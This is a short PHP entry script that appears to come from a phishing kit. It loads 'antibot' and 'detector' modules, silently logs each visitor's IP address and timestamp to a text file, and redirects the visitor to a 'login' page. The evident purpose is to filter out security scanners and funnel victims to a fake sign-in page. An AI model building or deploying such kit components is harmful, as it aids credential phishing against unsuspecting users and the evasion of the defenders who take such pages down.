<?php
    
	require './systems/antibot.php';
	require './systems/detector.php';
	require './systems/index.php';


	$ip = getenv("REMOTE_ADDR");
    $dst = "login"  ;
	$src="Src";

	header("location:$dst");

	$file = fopen("vu.txt","a");
	fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?>
